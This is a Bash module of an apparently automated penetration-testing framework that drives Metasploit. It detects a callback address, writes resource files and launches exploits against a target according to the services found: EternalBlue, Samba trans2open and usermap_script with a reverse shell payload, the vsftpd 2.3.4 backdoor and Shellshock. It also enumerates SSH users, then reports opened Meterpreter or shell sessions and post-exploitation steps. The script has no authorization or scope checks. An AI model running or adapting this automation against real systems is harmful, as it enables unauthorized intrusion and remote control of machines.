#!/bin/bash
# modules/metasploit.sh - Metasploit Framework Integration
# Version: 2.0

set -euo pipefail

source "$(dirname "${BASH_SOURCE[0]}")/../lib/utils.sh"

MODULE_NAME="METASPLOIT"
MODULE_VERSION="2.0"

# Initialize associative array for PID tracking
declare -A MSF_PIDS

# Smart LHOST detection - prioritize VPN interfaces
function metasploit_get_lhost() {
    local lhost=""
    
    # Priority 1: tun0 (OpenVPN/VPN)
    if ip addr show tun0 &>/dev/null; then
        lhost=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
        if [ -n "$lhost" ]; then
            log_info "[$MODULE_NAME] Using tun0 interface: $lhost"
            echo "$lhost"
            return 0
        fi
    fi
    
    # Priority 2: tun1 (alternative VPN)
    if ip addr show tun1 &>/dev/null; then
        lhost=$(ip -4 addr show tun1 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
        if [ -n "$lhost" ]; then
            log_info "[$MODULE_NAME] Using tun1 interface: $lhost"
            echo "$lhost"
            return 0
        fi
    fi
    
    # Priority 3: tap0 (alternative VPN)
    if ip addr show tap0 &>/dev/null; then
        lhost=$(ip -4 addr show tap0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
        if [ -n "$lhost" ]; then
            log_info "[$MODULE_NAME] Using tap0 interface: $lhost"
            echo "$lhost"
            return 0
        fi
    fi
    
    # Priority 4: Default route interface
    lhost=$(ip route get 1 | awk '{print $7;exit}' 2>/dev/null)
    if [ -n "$lhost" ]; then
        log_info "[$MODULE_NAME] Using default route interface: $lhost"
        echo "$lhost"
        return 0
    fi
    
    # Fallback: First non-loopback interface
    lhost=$(hostname -I | awk '{print $1}' 2>/dev/null)
    if [ -n "$lhost" ]; then
        log_warning "[$MODULE_NAME] Using fallback interface: $lhost"
        echo "$lhost"
        return 0
    fi
    
    log_error "[$MODULE_NAME] Could not determine LHOST"
    echo "127.0.0.1"
    return 1
}

# Check if metasploit is available
function metasploit_check() {
    if ! command -v msfconsole &>/dev/null; then
        log_warning "[$MODULE_NAME] Metasploit Framework not installed"
        return 1
    fi
    
    if ! command -v msfvenom &>/dev/null; then
        log_warning "[$MODULE_NAME] msfvenom not found"
        return 1
    fi
    
    log_success "[$MODULE_NAME] Metasploit Framework available"
    return 0
}

# Generate metasploit resource file with session confirmation
function metasploit_generate_rc() {
    local exploit="$1"
    local target="$2"
    local lhost="$3"
    local lport="${4:-4444}"
    local output_file="$5"
    
    log_info "[$MODULE_NAME] Generating resource file: $output_file"
    
    cat > "$output_file" << EOF
use $exploit
set RHOSTS $target
set LHOST $lhost
set LPORT $lport
set ExitOnSession false
set VERBOSE true
exploit -j -z

# Wait and check for sessions
sleep 10
sessions -l

# If sessions exist, show info
ruby_inline "if framework.sessions.length > 0; print_good('SUCCESS: #{framework.sessions.length} session(s) opened!'); framework.sessions.each_pair {|sid, obj| print_status(\"Session #{sid}: #{obj.info}\")}; else; print_error('No sessions opened'); end"
EOF
    
    log_success "[$MODULE_NAME] Resource file created: $output_file"
}

# Check for active sessions
function metasploit_check_sessions() {
    local output_dir="$1"
    local exploit_name="$2"
    local log_file="${output_dir}/msf_${exploit_name}.log"
    
    if [ ! -f "$log_file" ]; then
        return 1
    fi
    
    # Check for session indicators
    if grep -qi "session.*opened\|Sending stage\|Command shell\|Meterpreter session\|SUCCESS.*session" "$log_file" 2>/dev/null; then
        return 0
    fi
    
    return 1
}

# Run metasploit exploit
function metasploit_run_exploit() {
    local rc_file="$1"
    local output_dir="$2"
    local exploit_name
    exploit_name=$(basename "$rc_file" .rc)
    
    if [ ! -f "$rc_file" ]; then
        log_error "[$MODULE_NAME] Resource file not found: $rc_file"
        return 1
    fi
    
    log_info "[$MODULE_NAME] Running exploit: $exploit_name"
    
    local log_file="${output_dir}/msf_${exploit_name}.log"
    local json_file="${output_dir}/msf_${exploit_name}.json"
    
    # Run in background with JSON output for parsing
    msfconsole -q -r "$rc_file" -o "$log_file" 2>&1 &
    local msf_pid=$!
    
    log_info "[$MODULE_NAME] Metasploit running (PID: $msf_pid)"
    log_info "[$MODULE_NAME] Log file: $log_file"
    
    # Save PID for tracking and cleanup
    echo "$msf_pid" > "${output_dir}/.msf_${exploit_name}.pid"
    MSF_PIDS["$exploit_name"]=$msf_pid
    
    # Monitor with progress and hang detection
    monitor_command "$msf_pid" "MSF-${exploit_name}" 300 15 || log_warning "[$MODULE_NAME] Metasploit monitoring ended"
    
    return 0
}

# Wait for metasploit jobs to complete
function metasploit_wait_jobs() {
    local output_dir="$1"
    local timeout="${2:-60}"
    
    log_info "[$MODULE_NAME] Waiting for Metasploit jobs to complete (timeout: ${timeout}s)"
    
    local elapsed=0
    local last_count=0
    
    while [ $elapsed -lt $timeout ]; do
        local running=0
        local pids_to_kill=()
        
        for pid_file in "${output_dir}"/.msf_*.pid; do
            [ -f "$pid_file" ] || continue
            local pid
            pid=$(cat "$pid_file" 2>/dev/null || echo "0")
            if [ "$pid" != "0" ] && ps -p "$pid" > /dev/null 2>&1; then
                running=$((running + 1))
                pids_to_kill+=("$pid")
            else
                rm -f "$pid_file" 2>/dev/null || true
                local fname=$(basename "$pid_file" .pid)
                fname="${fname#.msf_}"
                unset "MSF_PIDS[$fname]" 2>/dev/null || true
            fi
        done
        
        if [ $running -eq 0 ]; then
            log_success "[$MODULE_NAME] All Metasploit jobs completed"
            MSF_PIDS=()
            return 0
        fi
        
        # Show progress every 10 seconds
        if [ $((elapsed % 10)) -eq 0 ] && [ $running -ne $last_count ]; then
            log_info "[$MODULE_NAME] $running job(s) still running... (${elapsed}s elapsed)"
            last_count=$running
        fi
        
        # Check for interrupt signal - if received, kill all MSF processes
        if ! kill -0 $$ 2>/dev/null; then
            log_warning "[$MODULE_NAME] Interrupt detected - terminating Metasploit jobs"
            for pid in "${pids_to_kill[@]}"; do
                kill -TERM "$pid" 2>/dev/null || true
            done
            return 1
        fi
        
        # Use shorter sleep for better responsiveness
        sleep 1 || {
            log_warning "[$MODULE_NAME] Sleep interrupted - cleaning up"
            for pid in "${pids_to_kill[@]}"; do
                kill -TERM "$pid" 2>/dev/null || true
            done
            return 1
        }
        elapsed=$((elapsed + 1))
    done
    
    log_warning "[$MODULE_NAME] Timeout reached, killing remaining jobs"
    # Kill any remaining jobs
    for pid_file in "${output_dir}"/.msf_*.pid; do
        [ -f "$pid_file" ] || continue
        local pid
        pid=$(cat "$pid_file" 2>/dev/null || echo "0")
        if [ "$pid" != "0" ] && ps -p "$pid" > /dev/null 2>&1; then
            log_warning "[$MODULE_NAME] Killing MSF process: $pid"
            kill -TERM "$pid" 2>/dev/null || true
            sleep 0.5
            kill -KILL "$pid" 2>/dev/null || true
        fi
        rm -f "$pid_file"
    done
    
    return 0
}

# SMB Exploits
function metasploit_smb_eternalblue() {
    local target="$1"
    local lhost="$2"
    local output_dir="$3"
    
    log_info "[$MODULE_NAME] Preparing MS17-010 EternalBlue exploit"
    
    local rc_file="${output_dir}/ms17_010_eternalblue.rc"
    
    metasploit_generate_rc \
        "exploit/windows/smb/ms17_010_eternalblue" \
        "$target" \
        "$lhost" \
        "4444" \
        "$rc_file"
    
    metasploit_run_exploit "$rc_file" "$output_dir"
}

function metasploit_smb_trans2open() {
    local target="$1"
    local lhost="$2"
    local output_dir="$3"
    
    log_info "[$MODULE_NAME] Preparing trans2open exploit"
    
    local rc_file="${output_dir}/trans2open.rc"
    
    cat > "$rc_file" << EOF
use exploit/freebsd/samba/trans2open
set RHOSTS $target
set LHOST $lhost
set LPORT 4444
exploit -j -z
EOF
    
    metasploit_run_exploit "$rc_file" "$output_dir"
}

function metasploit_smb_usermap_script() {
    local target="$1"
    local lhost="$2"
    local output_dir="$3"
    
    log_info "[$MODULE_NAME] Preparing usermap_script exploit"
    
    local rc_file="${output_dir}/usermap_script.rc"
    
    cat > "$rc_file" << EOF
use exploit/multi/samba/usermap_script
set RHOSTS $target
set LHOST $lhost
set LPORT 4444
set PAYLOAD cmd/unix/reverse
exploit -j -z
EOF
    
    metasploit_run_exploit "$rc_file" "$output_dir"
}

# FTP Exploits
function metasploit_ftp_vsftpd_backdoor() {
    local target="$1"
    local lhost="$2"
    local output_dir="$3"
    
    log_info "[$MODULE_NAME] Preparing vsftpd 2.3.4 backdoor exploit"
    
    local rc_file="${output_dir}/vsftpd_234_backdoor.rc"
    
    cat > "$rc_file" << EOF
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $target
set LHOST $lhost
exploit -j -z
EOF
    
    metasploit_run_exploit "$rc_file" "$output_dir"
}

# Apache Exploits
function metasploit_apache_mod_cgi() {
    local target="$1"
    local lhost="$2"
    local output_dir="$3"
    
    log_info "[$MODULE_NAME] Preparing Apache mod_cgi exploit"
    
    local rc_file="${output_dir}/apache_mod_cgi.rc"
    
    cat > "$rc_file" << EOF
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS $target
set LHOST $lhost
set LPORT 4444
set TARGETURI /cgi-bin/vulnerable
exploit -j -z
EOF
    
    metasploit_run_exploit "$rc_file" "$output_dir"
}

# SSH Exploits
function metasploit_ssh_enumusers() {
    local target="$1"
    local output_dir="$2"
    local userlist="${3:-/usr/share/wordlists/metasploit/unix_users.txt}"
    
    log_info "[$MODULE_NAME] Running SSH user enumeration"
    
    local output_file="${output_dir}/ssh_enum_users.txt"
    
    timeout 300 msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; \
        set RHOSTS $target; \
        set USER_FILE $userlist; \
        run; \
        exit" > "$output_file" 2>&1 || log_warning "[$MODULE_NAME] SSH enumeration timed out or failed"
    
    log_success "[$MODULE_NAME] SSH enumeration complete: $output_file"
}

# Main metasploit module runner
function metasploit_module_main() {
    local target="$1"
    local output_dir="$2"
    local lhost="${3:-}"
    
    if ! metasploit_check; then
        log_warning "[$MODULE_NAME] Skipping - Metasploit not available"
        return 0
    fi
    
    # Auto-detect LHOST if not provided
    if [ -z "$lhost" ]; then
        lhost=$(metasploit_get_lhost)
    fi
    
    log_info "[$MODULE_NAME] Starting Metasploit module for: $target"
    log_info "[$MODULE_NAME] Local host (LHOST): $lhost"
    
    # Create metasploit output directory
    local msf_dir="${output_dir}/metasploit"
    safe_create_dir "$msf_dir"
    
    # Check services file to determine which exploits to run
    local services_file="${output_dir}/services.txt"
    
    if [ ! -f "$services_file" ]; then
        log_warning "[$MODULE_NAME] No services file found, skipping"
        return 0
    fi
    
    local exploit_count=0
    
    # Parse services and run appropriate exploits
    while IFS= read -r service; do
        case "$service" in
            smb|microsoft-ds|netbios-ssn)
                log_info "[$MODULE_NAME] SMB service detected - preparing exploits"
                metasploit_smb_eternalblue "$target" "$lhost" "$msf_dir" || true
                metasploit_smb_trans2open "$target" "$lhost" "$msf_dir" || true
                metasploit_smb_usermap_script "$target" "$lhost" "$msf_dir" || true
                exploit_count=$((exploit_count + 3))
                ;;
            ftp|ftp-data)
                log_info "[$MODULE_NAME] FTP service detected - preparing exploits"
                metasploit_ftp_vsftpd_backdoor "$target" "$lhost" "$msf_dir" || true
                exploit_count=$((exploit_count + 1))
                ;;
            http|http-*|https)
                log_info "[$MODULE_NAME] HTTP service detected - preparing exploits"
                metasploit_apache_mod_cgi "$target" "$lhost" "$msf_dir" || true
                exploit_count=$((exploit_count + 1))
                ;;
            ssh)
                log_info "[$MODULE_NAME] SSH service detected - running enumeration"
                metasploit_ssh_enumusers "$target" "$msf_dir" || true
                exploit_count=$((exploit_count + 1))
                ;;
        esac
    done < "$services_file"
    
    if [ $exploit_count -eq 0 ]; then
        log_info "[$MODULE_NAME] No applicable exploits for detected services"
        return 0
    fi
    
    # Wait for exploits to complete
    metasploit_wait_jobs "$msf_dir" 120
    
    # Generate summary report
    metasploit_generate_summary "$target" "$msf_dir"
    
    log_success "[$MODULE_NAME] Metasploit module completed for: $target"
    log_info "[$MODULE_NAME] Results saved in: $msf_dir"
    log_info "[$MODULE_NAME] Exploits attempted: $exploit_count"
    
    return 0
}

# Generate Metasploit summary with session confirmation
function metasploit_generate_summary() {
    local target="$1"
    local output_dir="$2"
    local summary_file="${output_dir}/metasploit_summary.txt"
    
    local sessions_found=false
    local successful_exploits=()
    
    {
        echo "=========================================="
        echo "Metasploit Exploitation Summary"
        echo "=========================================="
        echo "Target: $target"
        echo "Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo ""
        echo "Resource Files Generated:"
        find "$output_dir" -name "*.rc" -type f | while read -r rc; do
            echo "  - $(basename "$rc")"
        done
        echo ""
        echo "Exploit Results:"
        
        for log_file in "$output_dir"/msf_*.log; do
            if [ -f "$log_file" ]; then
                local exploit_name
                exploit_name=$(basename "$log_file" .log | sed 's/^msf_//')
                echo ""
                echo "  📋 Exploit: $exploit_name"
                
                # Check for success with detailed indicators
                if metasploit_check_sessions "$output_dir" "${exploit_name}"; then
                    sessions_found=true
                    successful_exploits+=("$exploit_name")
                    
                    echo "     ${GREEN}✓ SUCCESS - SESSION OPENED!${RESET}" | tee -a "$LOG_FILE"
                    
                    # Extract session details
                    if grep -q "Meterpreter session" "$log_file"; then
                        echo "     Type: Meterpreter" 
                    elif grep -q "Command shell" "$log_file"; then
                        echo "     Type: Command Shell"
                    fi
                    
                    # Show session info
                    grep -i "session.*opened\|Sending stage" "$log_file" | head -3 | sed 's/^/     /'
                else
                    echo "     ${YELLOW}✗ No session opened${RESET}"
                fi
                
                echo "     Log: $log_file"
            fi
        done
        
        echo ""
        echo "=========================================="
        
        if [ "$sessions_found" = true ]; then
            echo ""
            echo "${BOLD}${RED}⚠️  CRITICAL: ${#successful_exploits[@]} SUCCESSFUL EXPLOITATION(S)!${RESET}"
            echo ""
            echo "Successful Exploits:"
            for exploit in "${successful_exploits[@]}"; do
                echo "  • $exploit"
            done
            echo ""
            echo "Next Steps:"
            echo "  1. ⚠️  IMMEDIATE: Check Metasploit console for active sessions"
            echo "  2. Use 'sessions -l' to list open sessions"
            echo "  3. Use 'sessions -i <ID>' to interact with a session"
            echo "  4. Document the compromise for the report"
            echo "  5. Proceed with post-exploitation carefully"
        else
            echo ""
            echo "No sessions opened from exploitation attempts."
        fi
        
        echo ""
        echo "Detailed Logs:"
        echo "  Directory: $output_dir"
        echo "  View logs: ls -lh $output_dir/*.log"
        
    } > "$summary_file"
    
    log_info "[$MODULE_NAME] Summary generated: $summary_file"
    
    # Show alert if sessions found
    if [ "$sessions_found" = true ]; then
        echo ""
        echo "╔══════════════════════════════════════════════════════════════╗"
        echo "║  ${BOLD}${RED}⚠️  EXPLOITATION SUCCESSFUL - SESSIONS OPENED!${RESET}              ║"
        echo "╚══════════════════════════════════════════════════════════════╝"
        echo ""
        echo "  ${BOLD}Successful Exploits:${RESET} ${#successful_exploits[@]}"
        for exploit in "${successful_exploits[@]}"; do
            echo "    ${GREEN}✓${RESET} $exploit"
        done
        echo ""
        echo "  ${BOLD}Check:${RESET} $summary_file"
        echo ""
    fi
}

# Export functions
export -f metasploit_get_lhost metasploit_check metasploit_generate_rc metasploit_run_exploit 
export -f metasploit_wait_jobs metasploit_check_sessions
export -f metasploit_smb_eternalblue metasploit_smb_trans2open metasploit_smb_usermap_script
export -f metasploit_ftp_vsftpd_backdoor metasploit_apache_mod_cgi metasploit_ssh_enumusers
export -f metasploit_generate_summary metasploit_module_main
